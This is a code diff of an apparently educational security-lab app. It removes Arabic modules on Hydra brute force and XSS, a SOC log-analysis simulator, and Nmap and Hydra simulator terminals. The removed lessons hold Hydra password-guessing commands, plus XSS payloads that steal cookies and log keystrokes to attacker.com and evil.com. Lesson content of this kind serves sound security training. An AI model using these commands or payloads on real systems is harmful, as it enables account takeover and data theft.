-// ─── الوحدة 5: Hydra ─────────────────────────────────────────────────────────
-{
-  id: 'hydra', num: '05',
-  title: 'هجمات القوة الغاشمة بـ Hydra',
-  subtitle: 'تعلّم كيف تعمل هجمات تخمين كلمات المرور، وكيف تستخدم Hydra لاختراق HTTP وSSH وFTP، وكيف تدافع ضدها.',
-  tag: 'الوحدة 5 — هجمات بيانات الاعتماد',
-
-  concept: [
-    `<strong>هجمات القوة الغاشمة</strong> فئة من الهجمات حيث يُجرّب المهاجم منهجياً كل تركيبة ممكنة من بيانات الاعتماد حتى يجد الصحيحة. في الممارسة، لا يُجرّب المهاجمون تركيبات عشوائية فعلاً — يستخدمون <strong>قوائم كلمات (قواميس)</strong>.`,
-    `<strong>Hydra</strong> (يُسمى أيضاً THC-Hydra) هو أداة تكسير تسجيل دخول شبكي سريعة ومتوازية مُثبّتة مسبقاً على Kali Linux. تدعم أكثر من 50 بروتوكولاً بما في ذلك HTTP وHTTPS وSSH وFTP وMySQL وRDP وSMB وغيرها.`,
-    `المفهوم الأساسي بسيط: تأخذ Hydra <strong>هدفاً</strong> (IP + منفذ)، <strong>بروتوكولاً</strong> (SSH، HTTP-form، FTP، إلخ)، <strong>اسم مستخدم أو قائمة أسماء مستخدمين</strong>، و<strong>كلمة مرور أو قائمة كلمات مرور</strong>. ثم تُجرّب كل تركيبة.`,
-    `<strong>قوائم الكلمات</strong> حاسمة. يشحن Kali Linux بعدة قوائم كلمات مدمجة في <code>/usr/share/wordlists/</code>. الأشهر هي <code>rockyou.txt</code> (14 مليون كلمة مرور مسرّبة).`
-  ],
-
-  analogy: { emoji: '🔑', text: `تخيّل أنك مقفل خارج منزلك ولديك حلقة مفاتيح ضخمة بها 10,000 مفتاح. تُجرّب كل مفتاح واحداً تلو الآخر حتى تفتح الباب. هجوم القوة الغاشمة يعمل بنفس الطريقة — إلا أن Hydra يمكنها تجربة مئات "المفاتيح" (كلمات المرور) في الثانية عبر الشبكة. كلما كانت حلقة مفاتيحك (قائمة الكلمات) أكبر وأذكى، كلما أسرعت في إيجاد المفتاح الصحيح.` },
-
-  steps: [
-    { title: 'تحديد موقع قوائم الكلمات على Kali', desc: 'يشحن Kali Linux بقوائم كلمات في <code>/usr/share/wordlists/</code>. الأهم هو <code>rockyou.txt</code>، قد يحتاج إلى فك الضغط أولاً:', code: { lang: 'bash', text: '# إدراج قوائم الكلمات المتاحة:\nls /usr/share/wordlists/\n\n# فك ضغط rockyou.txt إذا لزم:\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\n\n# التحقق من عدد الكلمات:\nwc -l /usr/share/wordlists/rockyou.txt\n# المخرجات: 14344392 (14+ مليون كلمة مرور)' } },
-    { title: 'اختراق تسجيل دخول DVWA (نموذج HTML قياسي)', desc: 'تستخدم DVWA نموذج POST HTML تقليدي. تحتاج ثلاثة أشياء: URL تسجيل الدخول، أسماء حقول النموذج، ورسالة الخطأ عند الفشل.', code: { lang: 'bash', text: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  localhost -s 8080 \\\n  http-post-form \\\n  "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"' } },
-    { title: 'اختراق Juice Shop (JSON API)', desc: 'تستخدم Juice Shop APIs JSON بدلاً من النماذج القياسية. تدعم Hydra بيانات JSON POST مباشرة.', code: { lang: 'bash', text: 'hydra -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt \\\n  localhost -s 3000 \\\n  http-post-form \\\n  "/rest/user/login:{\"email\":\"^USER^\",\"password\":\"^PASS^\"}:Invalid email or password:H=Content-Type: application/json"' } },
-    { title: 'اختراق SSH', desc: 'اختراق SSH مباشر — فقط حدد IP المستهدف والبروتوكول. استخدم <code>-t</code> لتحديد الخيوط المتوازية:', code: { lang: 'bash', text: '# مستخدم واحد، قائمة كلمات مرور:\nhydra -l root -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.1.1 -t 4\n\n# قائمة مستخدمين + قائمة كلمات مرور:\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt \\\n  ssh://192.168.1.1 -t 4' } },
-    { title: 'التحكم في السرعة والمخرجات', desc: 'استخدم <code>-t</code> للمهام المتوازية، و<code>-V</code> للمخرجات التفصيلية (يُظهر كل محاولة)، و<code>-o</code> لحفظ النتائج:', code: { lang: 'bash', text: '# وضع تفصيلي (عرض كل محاولة):\nhydra -l admin -P passwords.txt ssh://192.168.1.1 -V\n\n# حفظ النتائج في ملف:\nhydra -l admin -P passwords.txt ssh://192.168.1.1 -o results.txt' } }
-  ],
-
-  defense: [
-    { title: 'سياسات قفل الحساب', desc: 'اقفل الحسابات بعد N من المحاولات الفاشلة (مثلاً 5 خلال 10 دقائق). هذا يُبطئ هجمات القوة الغاشمة بشكل كبير. طبّق تأخيرات تدريجية.' },
-    { title: 'المصادقة متعددة العوامل (MFA)', desc: 'حتى لو خُمّنت كلمة المرور، يظل المهاجم بحاجة إلى العامل الثاني (رمز TOTP، مفتاح صلب، إشعار Push). MFA يجعل هجمات القوة الغاشمة عديمة الفائدة.' },
-    { title: 'تحديد المعدل (Rate Limiting)', desc: 'قيّد محاولات تسجيل الدخول لكل عنوان IP ولكل حساب. يمكن لأدوات مثل fail2ban حظر IPs تلقائياً تتجاوز الحد المسموح به.' },
-    { title: 'سياسات كلمات مرور قوية', desc: 'اشترط الحد الأدنى للطول (12+ حرفاً)، وتحقق من قوائم كلمات المرور المعروفة المخترقة، وشجّع على عبارات المرور.' },
-    { title: 'CAPTCHA', desc: 'أضف تحديات CAPTCHA بعد 2-3 محاولات تسجيل دخول فاشلة. هذا يوقف الأدوات الآلية مثل Hydra من إرسال النماذج بسرعة الآلة.' },
-    { title: 'المراقبة والتنبيه', desc: 'سجّل كل محاولات تسجيل الدخول الفاشلة. اضبط تنبيهات للشذوذات — مثلاً 100 تسجيل دخول فاشل من نفس IP.' }
-  ],
-
-  payloads: { headers: ['العلامة', 'الغرض', 'المثال'], rows: [
-    ['-l USER',      'اسم مستخدم مستهدف واحد',                        'hydra -l admin ...'],
-    ['-L FILE',      'ملف قائمة أسماء المستخدمين',                    'hydra -L users.txt ...'],
-    ['-p PASS',      'كلمة مرور مستهدفة واحدة',                        'hydra -l admin -p password123 ...'],
-    ['-P FILE',      'ملف قائمة كلمات المرور',                        'hydra -P rockyou.txt ...'],
-    ['-t N',         'عدد الخيوط المتوازية (افتراضي 16)',             'hydra ... -t 4'],
-    ['-V',           'تفصيلي — يُظهر كل محاولة تسجيل دخول',          'hydra ... -V'],
-    ['-o FILE',      'حفظ بيانات الاعتماد الموجودة في ملف',           'hydra ... -o results.txt'],
-    ['-f',           'توقف بعد العثور على أول بيانات اعتماد صحيحة',   'hydra ... -f'],
-    ['ssh://',       'بادئة بروتوكول SSH',                             'hydra -l root -P list.txt ssh://target'],
-    ['ftp://',       'بادئة بروتوكول FTP',                             'hydra -l admin -P list.txt ftp://target'],
-    ['http-post-form','وحدة اختراق نموذج HTTP POST',                  'hydra ... http-post-form "/login:u=^USER^&p=^PASS^:F=Failed"']
-  ]}
-},
-
-// ─── الوحدة 6: XSS ────────────────────────────────────────────────────────────
-{
-  id: 'xss', num: '06',
-  title: 'البرمجة النصية عبر المواقع (XSS)',
-  subtitle: 'تعلّم كيف يمكن لحقن سكريبتات ضارة من جانب العميل اختطاف جلسات المستخدم والتلاعب بصفحات الويب.',
-  tag: 'الوحدة 6 — هجمات جانب العميل',
-
-  concept: [
-    '<strong>البرمجة النصية عبر المواقع (XSS)</strong> تحدث عندما تُدرج تطبيق بيانات غير موثوقة في صفحة ويب دون تحقق أو ترميز مناسب. يتيح هذا للمهاجم تنفيذ JavaScript ضار في متصفح الضحية.',
-    '<strong>XSS المنعكس</strong> يحدث عندما يُعاد مدخل المستخدم فوراً (ينعكس) بواسطة تطبيق الويب في رسالة خطأ أو نتيجة بحث أو أي استجابة أخرى. عادةً ما تُسلَّم الحمولة عبر رابط مُصمَّم.',
-    '<strong>XSS المُخزَّن</strong> (الدائم) أكثر خطورة. يُحفظ السكريبت الضار على الخادم المستهدف (مثلاً في قاعدة بيانات عبر تعليق أو حقل ملف شخصي) ويُنفَّذ في كل مرة يُشاهد فيها المستخدم الصفحة المُصابة.',
-    '<strong>XSS القائم على DOM</strong> يحدث بالكامل في المتصفح عندما تأخذ JavaScript من جانب العميل بيانات من مصدر يتحكم فيه المهاجم (مثل تجزئة URL) وتمررها إلى sink خطير (مثل <code>innerHTML</code> أو <code>eval()</code>).'
-  ],
-
-  analogy: { emoji: '🎭', text: 'تخيّل أنك تضع ملصقاً على لوحة إعلانات مجتمعية. عادةً تكتب نصاً فقط. لكن إذا لم تقيّد اللوحة ما تُعلقه، يمكنك تعليق مجموعة سحرية من التعليمات تُنوّم من يقرأها. عندما تنظر الضحية إلى اللوحة، تُنفّذ تعليماتك دون وعي — ربما تُسلّم محفظتها. XSS هو حقن تلك التعليمات السحرية (JavaScript) في صفحة ويب.' },
-
-  steps: [
-    { title: 'XSS المنعكس عبر البحث', desc: 'في Juice Shop، يعكس شريط البحث مدخلاتك مباشرة في الصفحة. جرّب البحث عن وسم HTML مثل <code>&lt;h1&gt;Test&lt;/h1&gt;</code>. إذا رُسم النص كعنوان، فإن HTML يُفسَّر. الآن جرّب حمولة iframe:', code: { lang: 'html', text: '<iframe src="javascript:alert(\'xss\')">' } },
-    { title: 'XSS القائم على DOM عبر تجزئة URL', desc: 'يعالج إطار Angular لـ Juice Shop تجزئة URL من جانب العميل. إذا رُسمت هذه البيانات بشكل غير آمن في DOM، يُنشئ ذلك ناقل XSS قائم على DOM. جرّب الانتقال مباشرة إلى هذا URL:', code: { lang: 'url', text: 'http://localhost:3000/#/search?q=<iframe src="javascript:alert(\'xss\')">' } },
-    { title: 'XSS المُخزَّن عبر التعليقات', desc: 'انتقل إلى قسم ملاحظات العملاء. أدخل حمولة XSS في حقل التعليق. يُحفظ السكريبت في قاعدة البيانات وسيُنشَّط في كل مرة يُشاهد فيها التعليق.', code: { lang: 'html', text: '<script>alert("XSS مُخزَّن عبر التعليقات!")</script>' } },
-    { title: 'سرقة ملفات تعريف الارتباط', desc: 'الهدف الأكثر شيوعاً لـ XSS في الواقع هو سرقة ملفات تعريف ارتباط الجلسة. يكتب المهاجم سكريبتاً يقرأ <code>document.cookie</code> ويرسله إلى خادمه.', code: { lang: 'html', text: '<script>fetch("http://attacker.com/steal?cookie=" + btoa(document.cookie))</script>' } },
-    { title: 'تسجيل المفاتيح عبر XSS', desc: 'يمكن لحمولات XSS المتقدمة التقاط ضغطات المفاتيح بصمت على الصفحة المُصابة. يحقن المهاجم مستمع حدث يُوجّه كل مفتاح مضغوط إلى خادمه.', code: { lang: 'javascript', text: 'document.addEventListener("keypress", function(e) {\n  fetch("http://attacker.com/log?k=" + e.key);\n});' } }
-  ],
-
-  defense: [
-    { title: 'ترميز المخرجات بحسب السياق', desc: 'لا تثق أبداً بمدخلات المستخدم. قبل عرض البيانات في المتصفح، رمّزها بحسب مكان وضعها. استخدم أُطر عمل مثل React أو Angular التي تُهرّب تلقائياً.' },
-    { title: 'سياسة أمان المحتوى (CSP)', desc: 'تمنع CSP الصارمة المتصفح من تنفيذ السكريبتات المضمّنة وتقيّد مصادر تحميل السكريبتات الخارجية. تعمل كطبقة دفاع عميقة ضد XSS.' },
-    { title: 'ملفات تعريف الارتباط HttpOnly', desc: 'اضبط علامة <code>HttpOnly</code> على ملفات تعريف ارتباط الجلسة. هذا يمنع JavaScript من جانب العميل (وبالتالي هجمات XSS) من الوصول إليها.' },
-    { title: 'التعقيم (Sanitization)', desc: 'إذا كان يجب السماح للمستخدمين بتقديم نص غني (HTML)، استخدم مكتبة تعقيم قوية مثل DOMPurify لإزالة الوسوم والسمات الخطرة.' }
-  ],
-
-  payloads: { headers: ['الحمولة', 'النوع / الغرض', 'الوصف'], rows: [
-    ['<script>alert(1)</script>',             'أساسي',          'إثبات المفهوم الكلاسيكي. يُنفّذ مربع تنبيه بسيط.'],
-    ['<img src=x onerror=alert(1)>',          'ناقل الصورة',    'يُنفّذ JavaScript عندما يفشل المتصفح في تحميل مصدر الصورة الوهمية.'],
-    ['<iframe src="javascript:alert(1)">',    'Iframe',          'يُنفّذ سكريبت داخل iframe. غالباً يتجاوز فلاتر regex الأساسية.'],
-    ['<svg onload=alert(1)>',                 'ناقل SVG',        'يُنفّذ سكريبت عند اكتمال تحميل عنصر SVG.'],
-    ['javascript:alert(1)',                    'مخطط URI',        'يُستخدم في سمات href أو src التي تتوقع URL.'],
-    ['<script>fetch("http://evil.com/?c="+document.cookie)</script>', 'استخراج البيانات', 'يسرق ملف تعريف ارتباط الجلسة ويُرسله إلى المهاجم.']
-  ]}
-},
-
-// ─── الوحدة 7: محاكي SOC ─────────────────────────────────────────────────────
-{
-  id: 'soc-simulator', num: '07',
-  title: 'محلل SOC للفريق الأزرق',
-  subtitle: 'دافع عن الشبكة! راقب حركة المرور المباشرة، وحدد الاستغلال النشط، وعالج التهديد.',
-  tag: 'الوحدة 7 — المحاكاة الدفاعية',
-
-  concept: [
-    `<strong>مركز عمليات الأمن (SOC)</strong> هو مركز القيادة المركزي للفريق الأزرق. يراقب المحللون حركة مرور الشبكة وسجلات النظام وتنبيهات كشف التسلل لتحديد التهديدات النشطة وتحييدها في الوقت الفعلي.`,
-    `عندما يُشغّل المهاجم سكريبتات آلية (مثل Hydra أو SQLmap) أو يختبر حمولات يدوياً ضد تطبيقك، يترك أثراً من الفتات في سجلات وصول الخادم.`,
-    `مهمتك تحديد <strong>مؤشرات الاختراق (IoCs)</strong> — مثل أحجام حركة مرور غير طبيعية، أو أخطاء متكررة (401/403)، أو توقيعات ضارة (مثل <code>UNION SELECT</code> أو <code>../</code>) مخفية بين آلاف الأسطر من حركة مرور الويب الحميدة.`
-  ],
-
-  analogy: { emoji: '🕵️', text: `تخيّل أنك حارس أمن يُشاهد مئات كاميرات المراقبة في آنٍ واحد. معظم الناس يتسوقون فقط (حركة مرور طبيعية)، لكن شخصاً واحداً يحاول منهجياً مقبض كل باب مقفل في المبنى. مهمتك اكتشافه والاتصال بالدعم قبل أن يجد باباً مفتوحاً.` },
-
-  steps: [
-    { title: 'إطلاق المحاكي', desc: 'انقر على زر "بدء محاكي SOC" أدناه للدخول إلى طرفية تحليل السجلات المباشرة.', code: null },
-    { title: 'مراقبة تدفق حركة المرور', desc: 'شاهد تغذية سجلات الوصول المباشرة. تتكون حركة المرور الطبيعية من طلبات GET إلى الصور وملفات CSS والمسارات المنتظمة التي ترجع 200 OK.', code: null },
-    { title: 'تحديد ناقل الهجوم', desc: 'ابحث عن IoCs المحددة المُدرجة في لوحة هدف المهمة. أنت تتعقب حمولة حقن ضارة.', code: null },
-    { title: 'وضع علامة على التهديد', desc: 'عندما تُلاحظ سطر السجل الضار، انقر عليه فوراً لوضع علامة عليه كناقل تهديد.', code: null },
-    { title: 'تطبيق المعالجة', desc: 'بمجرد وضع علامة ناجحة على التهديد، ستُفتح لوحة المعالجة. اختر الإجراء الدفاعي الصحيح لتحييد الهجوم.', code: null }
-  ],
-
-  defense: [
-    { title: 'جدران حماية تطبيقات الويب (WAF)', desc: 'انشر WAF لحظر الطلبات التي تحتوي على توقيعات ضارة معروفة تلقائياً قبل وصولها إلى خادم التطبيق.' },
-    { title: 'تحديد المعدل (Rate Limiting)', desc: 'طبّق حدوداً صارمة للمعدل على نقاط النهاية الحساسة (مثل نماذج تسجيل الدخول) لإحباط هجمات القوة الغاشمة الآلية.' },
-    { title: 'التسجيل المركزي وإدارة أحداث الأمان (SIEM)', desc: 'اجمع كل سجلات التطبيق والخادم وجدار الحماية في نظام SIEM لاكتشاف الشذوذات الآلية والتنبيه.' }
-  ],
-
-  payloads: { headers: ['نمط السجل', 'نوع الهجوم', 'الوصف'], rows: [
-    ['GET /login.php HTTP/1.1" 401', 'القوة الغاشمة', 'الاستجابات المتكررة 401 لنقطة نهاية تسجيل دخول تشير إلى حشو بيانات الاعتماد.'],
-    ['GET /api/users?id=1+UNION+SELECT', 'حقن SQL', 'كلمة UNION علامة مميزة لمحاولات حقن SQL.'],
-    ['GET /image?file=../../../etc/passwd', 'اجتياز المسار', 'يحاول نمط ../ الهروب من جذر الويب وقراءة ملفات النظام التعسفية.'],
-    ['GET /search?q=<script>', 'XSS', 'وسوم HTML/Script الخام في معاملات URL تشير إلى محاولات XSS المنعكس.']
-  ]}
-}
-
-]; // end ARABIC_MODULES
-
-/* ═══════════════════════════════════════════════════════════════════════════════
    APPLICATION STATE & DOM
    ═══════════════════════════════════════════════════════════════════════════════ */
 
@@ -759,11 +429,6 @@ function selectModule(index) {
    ═══════════════════════════════════════════════════════════════════════════════ */
 
 function renderModule(mod) {
-  // Use Arabic module data if language is set to Arabic
-  if (currentLanguage === 'ar') {
-    const arMod = ARABIC_MODULES.find(m => m.id === mod.id);
-    if (arMod) mod = arMod;
-  }
   contentArea.innerHTML = `
     <div class="module-header fade-in">
       <span class="module-tag">${mod.tag}</span>
@@ -927,92 +592,6 @@ function renderModule(mod) {
         </div>
       `).join('');
     }
-  }
-
-  if (mod.id === 'nmap') {
-    const terminalHtml = `
-      <div class="section-card fade-in fade-in-delay-6" id="nmapTerminalSection">
-        <div class="section-header" style="background: rgba(0, 240, 255, 0.05); border-bottom: 1px solid var(--border-accent);">
-          <div class="section-icon concept" style="background: var(--cyan); color: #000;">💻</div>
-          <h3 class="section-title" style="color: var(--cyan);">Interactive Nmap Terminal</h3>
-        </div>
-        <div class="section-body">
-          <p>Practice running Nmap commands in this simulated environment. Try commands like <code>nmap 127.0.0.1</code> or <code>nmap -sV localhost</code>.</p>
-          <div id="nmapSimTerminal" class="terminal-window" style="height: 300px; display:flex; flex-direction:column; background:var(--bg-deep); padding:10px; border-radius:var(--radius); border:1px solid var(--border); font-family:var(--font-mono); font-size:13px; color:#a6accd; overflow-y:auto; margin-top:15px; position:relative;">
-            <div id="nmapSimOutput" style="white-space:pre-wrap; margin-bottom:10px; line-height:1.5;">CyberCompanion Nmap Simulator v1.0.0<br>Ready.</div>
-            <div style="display:flex; align-items:center;">
-              <span style="color:var(--cyan); margin-right:8px;">[user@cyber-lab ~]$</span>
-              <input type="text" id="nmapSimInput" class="nmap-tut-target" autocomplete="off" spellcheck="false" style="flex:1; background:transparent; border:none; color:#a6accd; font-family:var(--font-mono); font-size:13px; outline:none;" placeholder="Type an nmap command here...">
-            </div>
-          </div>
-        </div>
-      </div>
-    `;
-    
-    const challengesSection = document.getElementById('interactiveChallengesSection');
-    if (challengesSection) {
-      challengesSection.style.display = 'block';
-      challengesSection.insertAdjacentHTML('afterend', terminalHtml);
-    } else {
-      document.getElementById('contentArea').insertAdjacentHTML('beforeend', terminalHtml);
-    }
-    
-    setTimeout(() => {
-      const inputEl = document.getElementById('nmapSimInput');
-      if (inputEl) {
-        inputEl.addEventListener('keydown', (e) => {
-          if (e.key === 'Enter') {
-            const cmd = inputEl.value.trim();
-            if (cmd) window.__app.handleNmapCommand(cmd);
-            inputEl.value = '';
-          }
-        });
-      }
-    }, 100);
-  }
-
-  if (mod.id === 'hydra') {
-    const terminalHtml = `
-      <div class="section-card fade-in fade-in-delay-6" id="hydraTerminalSection">
-        <div class="section-header" style="background: rgba(236, 72, 153, 0.05); border-bottom: 1px solid rgba(236, 72, 153, 0.3);">
-          <div class="section-icon concept" style="background: #ec4899; color: #fff;">💻</div>
-          <h3 class="section-title" style="color: #ec4899;">Interactive Hydra Terminal</h3>
-        </div>
-        <div class="section-body">
-          <p>Practice running Hydra brute force commands in this simulated environment. Try commands like <code>hydra -l admin -P rockyou.txt ssh://192.168.1.1</code>.</p>
-          <div id="hydraSimTerminal" class="terminal-window" style="height: 300px; display:flex; flex-direction:column; background:var(--bg-deep); padding:10px; border-radius:var(--radius); border:1px solid var(--border); font-family:var(--font-mono); font-size:13px; color:#a6accd; overflow-y:auto; margin-top:15px; position:relative;">
-            <div id="hydraSimOutput" style="white-space:pre-wrap; margin-bottom:10px; line-height:1.5;">CyberCompanion Hydra Simulator v1.0.0
-Hydra (THC) — Network Login Cracker
-Ready. Type 'hydra' for usage help.</div>
-            <div style="display:flex; align-items:center;">
-              <span style="color:#ec4899; margin-right:8px;">[user@cyber-lab ~]$</span>
-              <input type="text" id="hydraSimInput" class="hydra-tut-target" autocomplete="off" spellcheck="false" style="flex:1; background:transparent; border:none; color:#a6accd; font-family:var(--font-mono); font-size:13px; outline:none;" placeholder="Type a hydra command here...">
-            </div>
-          </div>
-        </div>
-      </div>
-    `;
-    
-    const challengesSection = document.getElementById('interactiveChallengesSection');
-    if (challengesSection) {
-      challengesSection.style.display = 'block';
-      challengesSection.insertAdjacentHTML('afterend', terminalHtml);
-    } else {
-      document.getElementById('contentArea').insertAdjacentHTML('beforeend', terminalHtml);
-    }
-    
-    setTimeout(() => {
-      const inputEl = document.getElementById('hydraSimInput');
-      if (inputEl) {
-        inputEl.addEventListener('keydown', (e) => {
-          if (e.key === 'Enter') {
-            const cmd = inputEl.value.trim();
-            if (cmd) window.__app.handleHydraCommand(cmd);
-            inputEl.value = '';
-          }
-        });
-      }
-    }, 100);
   }
 
   // Setup copy buttons
@@ -1401,18 +980,14 @@ function toggleOverlayPanel() {
 }
 
 function startTutorial(tutorialKey) {
+  if (!isLabMode) toggleLabMode();
+  
   if (!window.TUTORIALS || !window.TUTORIALS[tutorialKey]) {
     alert("Tutorial not found!");
     return;
   }
   
   const tut = window.TUTORIALS[tutorialKey];
-  
-  // Only enter lab mode (split screen with Juice Shop) if the tutorial requires the webview
-  // Nmap and Hydra tutorials run directly inside the content area's simulated terminal
-  if (tut.module !== 'nmap' && tut.module !== 'hydra' && !isLabMode) {
-    toggleLabMode();
-  }
   
   const tutorialCSS = `
     #cyber-tut-backdrop {
@@ -1637,23 +1212,6 @@ function startTutorial(tutorialKey) {
           self.advance();
         };
         target.addEventListener('click', clickHandler);
-      } else if (step.action === 'input' && target !== document.body) {
-        var inputHandler = function() {
-          if (target.value && target.value.trim() === step.waitForValue) {
-            target.removeEventListener('input', inputHandler);
-            self.advance();
-          }
-        };
-        target.addEventListener('input', inputHandler);
-      } else if (step.action === 'enter' && target !== document.body) {
-        var keydownHandler = function(e) {
-          if (e.key === 'Enter') {
-            target.removeEventListener('keydown', keydownHandler);
-            // Give a tiny delay so the actual enter command triggers first
-            setTimeout(function() { self.advance(); }, 50);
-          }
-        };
-        target.addEventListener('keydown', keydownHandler);
       }
     },
 
@@ -1670,22 +1228,6 @@ function startTutorial(tutorialKey) {
 `;
 
   const play = () => {
-    if (tut.module === 'nmap' || tut.module === 'hydra') {
-      if (!document.getElementById('cyber-tut-styles')) {
-        const styleEl = document.createElement('style');
-        styleEl.id = 'cyber-tut-styles';
-        styleEl.textContent = tutorialCSS;
-        document.head.appendChild(styleEl);
-      }
-      const engineFn = new Function(tutorialEngineCode);
-      engineFn();
-      
-      // Auto scroll to terminal
-      const termSection = document.getElementById(tut.module === 'nmap' ? 'nmapTerminalSection' : 'hydraTerminalSection');
-      if (termSection) termSection.scrollIntoView({ behavior: 'smooth' });
-      return;
-    }
-
     // If the first step has a hash, navigate there first
     if (tut.steps[0] && tut.steps[0].hash) {
       webviewEl.executeJavaScript(`window.location.hash = '${tut.steps[0].hash}';`);
@@ -1702,9 +1244,7 @@ function startTutorial(tutorialKey) {
     }
   };
 
-  if (tut.module === 'nmap' || tut.module === 'hydra') {
-    play();
-  } else if (webviewLoading.style.display === 'flex') {
+  if (webviewLoading.style.display === 'flex') {
     webviewEl.addEventListener('did-finish-load', play, { once: true });
   } else {
     play();
@@ -1851,22 +1391,15 @@ function startSocSimulator() {
         let sourcePort = Math.floor(Math.random() * 50000 + 1024);
         let userAgent = isMalicious ? 'curl/7.68.0' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
         intelPanel.innerHTML = `
-          <div class="intel-item" style="background:var(--bg-deep); padding:8px; border-radius:4px; margin-bottom:12px; border-left:3px solid var(--cyan);">
-            <div style="font-size:10px; color:var(--text-muted); text-transform:uppercase; margin-bottom:4px;">Captured Request</div>
-            <div style="color:var(--cyan); word-break:break-all;"><strong>${actualMethod}</strong> ${actualPath}</div>
-            <div style="color:var(--text-secondary); margin-top:4px; font-size:11px;">Status: ${actualStatus}</div>
-          </div>
-          <div class="intel-item"><strong>IP Address:</strong> <span>${actualIp}</span></div>
-          <div class="intel-item"><strong>Source Port:</strong> <span>${sourcePort}</span></div>
-          <div class="intel-item"><strong>User Agent:</strong> <span>${userAgent}</span></div>
-          <div class="intel-item"><strong>GeoLocation:</strong> <span>${geo}</span></div>
-          <div class="intel-item"><strong>Threat Score:</strong> <span>${riskScore}/100</span></div>
-          <div class="intel-item"><strong>Reputation:</strong> <span>${rep}</span></div>
+          <div style="margin-bottom:10px;"><strong>IP Address:</strong> ${actualIp}</div>
+          <div style="margin-bottom:10px;"><strong>Source Port:</strong> ${sourcePort}</div>
+          <div style="margin-bottom:10px;"><strong>User Agent:</strong> ${userAgent}</div>
+          <div style="margin-bottom:10px;"><strong>GeoLocation:</strong> ${geo}</div>
+          <div style="margin-bottom:10px;"><strong>Threat Score:</strong> ${riskScore}/100</div>
+          <div style="margin-bottom:10px;"><strong>Reputation:</strong> ${rep}</div>
           <div style="margin-top:15px; padding-top:10px; border-top:1px solid var(--border-accent);">
             <strong>Analysis:</strong><br>
-            <span style="color:var(--text-secondary); font-size:11px;">
-              ${isMalicious ? 'Pattern matches known exploitation signatures. Immediate mitigation required.' : 'Traffic patterns appear nominal. No malicious signatures detected.'}
-            </span>
+            ${isMalicious ? 'Pattern matches known exploitation signatures. Immediate mitigation required.' : 'Traffic patterns appear nominal. No malicious signatures detected.'}
           </div>
         `;
       }
@@ -1886,7 +1419,7 @@ function startSocSimulator() {
         // Briefly show error toast
         const toast = document.createElement('div');
         toast.style = 'position:fixed; bottom:20px; right:20px; background:var(--danger); color:white; padding:10px 20px; border-radius:4px; z-index:9999;';
-        toast.textContent = (window.__i18n && window.__i18n.lang === 'ar') ? 'نتيجة إيجابية خاطئة. استمر في البحث.' : 'False Positive. Keep looking.';
+        toast.textContent = 'False Positive. Keep looking.';
         document.body.appendChild(toast);
         setTimeout(() => toast.remove(), 2000);
       }
@@ -2115,651 +1648,6 @@ function resumeSocSimulator() {
 }
 
 /* ═══════════════════════════════════════════════════════════════════════════════
-   SETTINGS & THEMES
-   ═══════════════════════════════════════════════════════════════════════════════ */
-
-function toggleSettings() {
-  const modal = document.getElementById('settingsModal');
-  if (modal.classList.contains('active')) {
-    modal.classList.remove('active');
-  } else {
-    modal.classList.add('active');
-  }
-}
-
-function toggleSidebar() {
-  const sidebar = document.getElementById('sidebar');
-  if (sidebar) {
-    sidebar.classList.toggle('collapsed');
-  }
-}
-
-/* ═══════════════════════════════════════════════════════════════════════════════
-   NMAP SIMULATOR
-   ═══════════════════════════════════════════════════════════════════════════════ */
-
-function handleNmapCommand(cmd) {
-  const outputEl = document.getElementById('nmapSimOutput');
-  const terminalEl = document.getElementById('nmapSimTerminal');
-  if (!outputEl) return;
-
-  // Print the user's command
-  outputEl.innerHTML += `\n<span style="color:var(--cyan);">[user@cyber-lab ~]$</span> ${escapeHtml(cmd)}\n`;
-  
-  if (!cmd.startsWith('nmap') && !cmd.startsWith('ping')) {
-    outputEl.innerHTML += `<span style="color:var(--danger);">Command not found or not supported in this simulator. Try 'nmap' or 'ping'.</span>\n`;
-    terminalEl.scrollTop = terminalEl.scrollHeight;
-    return;
-  }
-
-  // Simulate processing delay
-  const isPing = cmd.startsWith('ping');
-  const delay = isPing ? 500 : 1500;
-  
-  outputEl.innerHTML += `<span id="nmapSimLoading" style="color:var(--text-muted);">Executing...</span>`;
-  terminalEl.scrollTop = terminalEl.scrollHeight;
-
-  setTimeout(() => {
-    const loading = document.getElementById('nmapSimLoading');
-    if (loading) loading.remove();
-
-    let result = '';
-    
-    if (isPing) {
-      result = `PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
-64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
-64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.041 ms
-64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.038 ms
-
---- 127.0.0.1 ping statistics ---
-3 packets transmitted, 3 received, 0% packet loss, time 2045ms
-rtt min/avg/max/mdev = 0.032/0.037/0.041/0.003 ms`;
-    } else if (cmd.includes('-A')) {
-      result = `Starting Nmap 7.93 ( https://nmap.org )
-Nmap scan report for localhost (127.0.0.1)
-Host is up (0.00013s latency).
-Not shown: 998 closed tcp ports (conn-refused)
-PORT     STATE SERVICE VERSION
-3000/tcp open  http    Node.js Express framework
-|_http-title: OWASP Juice Shop
-8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-|_http-title: Damn Vulnerable Web App
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds`;
-    } else if (cmd.includes('-sV')) {
-      result = `Starting Nmap 7.93 ( https://nmap.org )
-Nmap scan report for localhost (127.0.0.1)
-Host is up (0.00015s latency).
-Not shown: 998 closed tcp ports (conn-refused)
-PORT     STATE SERVICE VERSION
-3000/tcp open  http    Node.js Express framework
-8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 6.12 seconds`;
-    } else if (cmd.includes('-sn')) {
-      result = `Starting Nmap 7.93 ( https://nmap.org )
-Nmap scan report for 192.168.1.1
-Host is up (0.0020s latency).
-Nmap scan report for 192.168.1.10
-Host is up (0.0031s latency).
-Nmap scan report for 192.168.1.105
-Host is up (0.0011s latency).
